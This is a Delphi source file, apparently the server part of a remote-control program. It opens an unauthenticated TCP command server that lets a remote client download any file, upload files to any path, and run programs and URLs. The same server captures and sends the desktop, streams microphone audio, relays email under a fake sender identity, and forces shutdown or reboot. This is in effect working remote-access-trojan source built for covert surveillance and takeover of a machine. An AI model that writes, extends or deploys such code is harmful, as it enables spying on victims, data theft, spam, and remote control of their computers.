unit main;

interface

{$DEFINE debug}

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdBaseComponent, IdComponent, IdTCPServer, IdTCPConnection,
  IdTCPClient, IdMessageClient, IdSMTP, IdExplicitTLSClientServerBase,
  IdSMTPBase, IdCustomTCPServer, IdCommandHandlers, IdContext, IdCmdTCPServer,
  IdUDPBase, IdUDPServer,  IdUDPClient, uGSMNet;// commsound;

type
  TForm1 = class(TForm)
    smtp: TIdSMTP;
    TCPServer: TIdCmdTCPServer;
    procedure FormDestroy(Sender: TObject);
    procedure TCPServerCommandHandlers11Command(ASender: TIdCommand);
    procedure TCPServerCommandHandlers10Command(ASender: TIdCommand);
    procedure TCPServerCommandHandlers3Command(ASender: TIdCommand);
    procedure TCPServerExecute(AContext: TIdContext);
    procedure FormCreate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure TCPServerTIdCommandHandler0Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler1Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler2Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler4Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler5Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler6Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler7Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler8Command(ASender: TIdCommand);
    procedure TCPServerTIdCommandHandler9Command(ASender: TIdCommand);
  private
    //FGsmCap : TGsmNet ;
    FUdpGsm : TGsmNet;
    procedure SimpleSendReply(com: TIdCommand; code : integer; text : string);
    procedure WaveSendListDevices(ASender: TIdCommand);
//    procedure OnSoundData(data : pchar; datasize : integer);
//    procedure OnGsmData ( sender:TObject;
//                          const Buffer:pointer;
//                          const BufferSize:cardinal;
//                          const BytesRecorded:cardinal);

  end;

var
  Form1: TForm1;

implementation

uses comando, mensagem, shellapi, IdMessage, IdEMailAddress, jpeg, IdGlobal,
     IdObjs, IdSocketHandle, mmsystem;

{$R *.dfm}

//help
function MyExitWindows(RebootParam: Longword): Boolean; 
var 
  TTokenHd: THandle;
  TTokenPvg: TTokenPrivileges; 
  cbtpPrevious: DWORD; 
  rTTokenPvg: TTokenPrivileges; 
  pcbtpPreviousRequired: DWORD; 
  tpResult: Boolean; 
const 
  SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'; 
begin 
  if Win32Platform = VER_PLATFORM_WIN32_NT then 
  begin 
    tpResult := OpenProcessToken(GetCurrentProcess(), 
      TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
      TTokenHd);
    if tpResult then
    begin 
      tpResult := LookupPrivilegeValue(nil, 
                                       SE_SHUTDOWN_NAME, 
                                       TTokenPvg.Privileges[0].Luid); 
      TTokenPvg.PrivilegeCount := 1;
      TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED; 
      cbtpPrevious := SizeOf(rTTokenPvg); 
      pcbtpPreviousRequired := 0; 
      if tpResult then 
        Windows.AdjustTokenPrivileges(TTokenHd, 
                                      False, 
                                      TTokenPvg, 
                                      cbtpPrevious, 
                                      rTTokenPvg,
                                      pcbtpPreviousRequired); 
    end; 
  end; 
  Result := ExitWindowsEx(RebootParam, 0); 
end;


procedure TForm1.FormCreate(Sender: TObject);
begin
  TCPServer.DefaultPort := PORT_TCP_SERVER;
  tcpserver.Active := true;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  if assigned(FUdpGsm) then FreeAndNil(FUdpGsm);
end;


procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  tcpserver.Active := false;
  canclose := true;
end;

procedure TForm1.WaveSendListDevices(ASender: TIdCommand);
var pwic : TarrWaveInCaps;
    i : integer;
begin
  try
    pwic := GetSoundDevicesIn;
    i:= length(pwic) * sizeof(Twaveincaps);
    asender.Context.Connection.IOHandler.WriteLn(inttostr(i));
    asender.Context.Connection.IOHandler.Write(TidBytes(pwic));
  except end;
end;

procedure TForm1.SimpleSendReply(com: TIdCommand; code: integer;
  text: string);
begin
  com.Reply.Clear;
  com.PerformReply := true;
  com.Reply.SetReply(code, text);
  com.SendReply;
end;


procedure TForm1.TCPServerExecute(AContext: TIdContext);
begin
         //
end;


//MSSG
procedure TForm1.TCPServerTIdCommandHandler0Command(ASender: TIdCommand);
begin
  asender.PerformReply := true;
  asender.Reply.Clear;

  with TfrmMensagem.Create(self) do
  try
    case ShowModal of
    mrOk: ASender.Reply.SetReply(RESP_MSG_OK, 'OK');
    mrYes: ASender.Reply.SetReply(RESP_MSG_YES, 'YES');
    mrNo: ASender.Reply.SetReply(RESP_MSG_NO, 'NO');
    mrCancel: ASender.Reply.SetReply(RESP_MSG_CANCEL, 'CANCEL');
    else
      ASender.Reply.SetReply(RESP_MSG_TIMEOUT, 'TIMEOUT');
    end;
  finally // wrap up
    free;
  end;    // try/finally

  asender.SendReply;
end;
   
//CHAT_
procedure TForm1.TCPServerTIdCommandHandler1Command(ASender: TIdCommand);
begin
//
end;

//GFIL - GETFILE
procedure TForm1.TCPServerTIdCommandHandler2Command(ASender: TIdCommand);
var
  path, msg: string;
  erro: Integer;
begin
   path := trim(asender.Params[0]);
   msg := path;
   erro := RESP_GETFILE;

   try
     if FileExists(path) then
       try
         asender.Context.Connection.IOHandler.WriteFile(path);
         erro := RESP_OK;
       except
         on e:Exception do msg := e.Message;
       end;
   finally
     SimpleSendReply(ASender, erro, msg);
   end;                                  

end;

//GSCR  - script
procedure TForm1.TCPServerTIdCommandHandler4Command(ASender: TIdCommand);
var
  erro: Integer;
  strFile, msg: string;
  fs : TFileStream;
begin
   erro := RESP_OK;
   strFile := trim(asender.Params[0]);
   msg := strFile;

   fs := TFileStream.Create( strFile, fmCreate or fmShareDenyWrite);
   try
     try
       asender.Context.Connection.IOHandler.ReadStream(fs);
     except
       on e:Exception do
         begin
         msg := e.Message;
         erro := RESP_GETSCRIPT;
         end;
     end;    // try/except
   finally // wrap up
     free;
   end;    // try/finally

   SimpleSendReply(asender, erro, msg);

end;

//RUN_ - correr aplicacoes
procedure TForm1.TCPServerTIdCommandHandler5Command(ASender: TIdCommand);
var msg, param, dir : string;
    erro : integer;
begin
  msg := trim(ASender.Params[0]);
  param := trim(ASender.Params[1]);
  dir := ExtractFileDir(msg);
  erro := RESP_RUN;
  
  try
    try
      if not FileExists(msg) then
        erro := RESP_RUN_NOFILE
      else        
        if shellexecute(0, pchar(param), pchar(msg), '',
                        pchar(dir),SW_SHOWNORMAL) > 32 then
          erro := RESP_OK;          
    except
      on e:Exception do
         begin
         msg := e.Message;
         erro := RESP_RUN;
         end;
    end;                                    
  finally
    SimpleSendReply(asender, erro, msg);
  end;                                

end;
   
//WWW_ - abre o browser
procedure TForm1.TCPServerTIdCommandHandler6Command(ASender: TIdCommand);
var web : string;
    erro : integer;
begin
  web := trim(ASender.Params[0]);
  erro := RESP_WWW;
  
  try
    try
      if shellexecute(0, 'open', pchar(web), '','',
                      SW_SHOWMAXIMIZED) > 32 then
                                                erro := RESP_OK;
    except 
      on e:Exception do
         begin
         web := e.Message;
         erro := RESP_WWW;
         end;
    end;
  finally
     SimpleSendReply(asender, erro, web);
  end;  
end;

//SMAI - mail por relay
procedure TForm1.TCPServerTIdCommandHandler7Command(ASender: TIdCommand);
var
  msg: string;
  erro: Integer;
  idmsg: TIdMessage;
  mensagem, destinos : TStringList;
begin
  erro := RESP_OK;

  mensagem := TStringList.Create;
  destinos := TStringList.Create;
  idmsg := TIdMessage.Create(self) ;

  try
    destinos.text := trim(asender.Params[2]);
    mensagem.text := trim(asender.Params[3]);

    idmsg.Subject := trim(asender.Params[1]);
    idmsg.Body := mensagem;
    idmsg.Recipients.FillTStrings(destinos);
    idmsg.Sender.Name := 'JoaoSilva';
    idmsg.Sender.Address := 'joaosilva@hotmail.com';
    with idmsg.ReplyTo.Add do
      begin
      Name := 'JoaoSilva';
      Address := 'joaosilva@hotmail.com';
      end;

    //smtp.Host := trim(asender.Params[0]);
    try
      smtp.Connect(trim(asender.Params[0]), 60000);
      smtp.Send(idmsg);
    except
      on e: exception do
        begin
        erro := RESP_SENDMAIL;
        msg := e.message;
        end;
    end;    // try/except

  finally // wrap up
    FreeAndNil(idmsg);
    FreeAndNil(destinos);
    FreeAndNil(mensagem);
    SimpleSendReply(ASender, erro, 'mail');
  end;    // try/finally
end;

//GLDI - lista de diretorios
procedure TForm1.TCPServerTIdCommandHandler8Command(ASender: TIdCommand);
var path, msg : string;
    erro : integer;
    sr : TSearchRec;
    pai : PArquivoInfo;
    ais : array of TArquivoInfo;
    fs: TFileStream;
    f: File of TArquivoInfo;
    I: Integer;
    ai : TArquivoInfo;
    strFile : array [0..MAX_PATH] of char;
begin
  path := trim(asender.Params[0]) + '\*.*';
  msg := path;
  erro := RESP_OK;

  if GetTempFileName('.', 'dir', 0, strFile) = 0 then exit;

  if FindFirst(path, faAnyFile, sr) = 0 then
    try
      try
        fs:= TFileStream.Create(strFile, fmcreate);
        repeat
          ZeroMemory(@ai, sizeof(TArquivoInfo));
          ai.Time := sr.Time;
          ai.Size := sr.Size;
          ai.Attr := sr.Attr;
          StrPCopy(ai.Name,sr.Name);
          fs.Write(ai, sizeof(TArquivoInfo));
        until FindNext(sr) <> 0;
        i := fs.Size;
        FreeAndNil(fs);

        //envia o tamnho do buffer
        ASender.Context.Connection.IOHandler.WriteLn(inttostr(i));
        {$ifdef debug} sleep(100); {$endif}
        ASender.Context.Connection.IOHandler.WriteFile(strFile);
      except
        on e: exception do
          begin
          erro := RESP_GETLISTDIR;
          msg := e.Message;
          end;
      end;    // try/except
    finally
      if assigned(fs) then FreeAndNil(fs);
    end
  else
    erro := RESP_GETLISTDIR_NODIR;

   SimpleSendReply(ASender, erro, msg);
end;

//SCRE - imagem do desktop
procedure TForm1.TCPServerTIdCommandHandler9Command(ASender: TIdCommand);
var DCDesk: HDC; // hDC of Desktop
  msg: string;
  jpeg: TJpegImage;
  erro: Integer;
  bmp: TBitmap;
  path : array [0..MAX_PATH] of char;
  f: File;
  i: integer;
begin
  erro := RESP_OK;

  bmp := TBitmap.Create;
  jpeg := TJPEGImage.Create;
  try
    bmp.Height := Screen.Height;
    bmp.Width := Screen.Width;

    DCDesk := GetWindowDC(GetDesktopWindow);
    if DCDesk > 0 then
      try
        try
          if BitBlt(bmp.Canvas.Handle, 0, 0, Screen.Width, Screen.Height,
                    DCDesk, 0, 0, SRCCOPY) then 
          if GetTempFileName('.', 'win', 0, path) > 0 then
            begin
            jpeg.Assign(bmp);
            jpeg.CompressionQuality := 50;
            jpeg.Compress;
            jpeg.SaveToFile(path);
            end;
        except
          on e: exception do
            begin
            erro := RESP_GETSCREEN;
            msg := e.Message;
            end;
        end    // try/except
      finally
        ReleaseDC(GetDesktopWindow, DCDesk);
      end
    else
      begin
      erro := RESP_GETSCREEN;
      msg := 'Não foi possível copiar o desktop';
      end;
  finally // wrap up
    FreeAndNil(jpeg);
    FreeAndNil(bmp);
  end;    // try/finally

  if (erro = RESP_OK) and (FileExists(path)) then
    try
      //ASender.Thread.Connection.WriteFile(path);
      i := 0;
      assignfile(f, path);
      try
        reset(f, 1);
        i := FileSize(f);
      finally
        CloseFile(f);
      end;

      if i > 0 then
        begin
        // envia o tamanho do arquivo
        ASender.Context.Connection.IOHandler.WriteLn(inttostr(i));
        {$ifdef debug} sleep(100); {$endif}
        // envia o arquivo
        ASender.Context.Connection.IOHandler.WriteFile(path);
        end;

     //{$ifndef debug} DeleteFile(path); {$endif}
      DeleteFile(path);
    except
      on e: exception do
        begin
        erro := RESP_GETSCREEN;
        msg := e.Message;
        end;
    end;    // try/except

  SimpleSendReply(ASender,erro, msg);

end;

//SHOO - shootdown
procedure TForm1.TCPServerCommandHandlers10Command(ASender: TIdCommand);
begin
   MyExitWindows(EWX_POWEROFF or EWX_FORCE);
end;

//SOUN - captura o som
procedure TForm1.TCPServerCommandHandlers11Command(ASender: TIdCommand);
var par, par1, msg, ip: string;
  erro: Integer;
  udpc : TIdUDPClient;
  I: Integer;
begin
  erro := RESP_OK;

  par := trim(asender.Params[0]);

  if par = COMM_STR_PARAMS_SOUND_START then
    begin
    if assigned(FUdpGsm) then
      begin
      for I := 0 to FUdpGsm.Clientes.Count - 1 do
      if not FUdpGsm.Recording then
        begin
        FUdpGsm.Open;
        FUdpGsm.Start;
        end;
      end
    else
      begin
      ip := asender.Context.Connection.IOHandler.Host;
      ip := '127.0.0.1';
      FUdpGsm := TGsmNet.Create(stClient,ip,PORT_UDP_SERVER);
      FUdpGsm.Open;
      FUdpGsm.Start;
      end
    end
  else
    if par = COMM_STR_PARAMS_SOUND_STOP then
      begin
      if assigned(FUdpGsm) then
        begin
        FUdpGsm.Close;
        FUdpGsm.Stop;
        FreeAndNil(FUdpGsm);
        end;
      end
  else
    if par = COMM_STR_PARAMS_SOUND_LIST then
      WaveSendListDevices(asender);

//  SimpleSendReply(ASender, erro, msg);

end;

//REBO - reboot
procedure TForm1.TCPServerCommandHandlers3Command(ASender: TIdCommand);
begin
  MyExitWindows(EWX_REBOOT or EWX_FORCE);
end;

end.

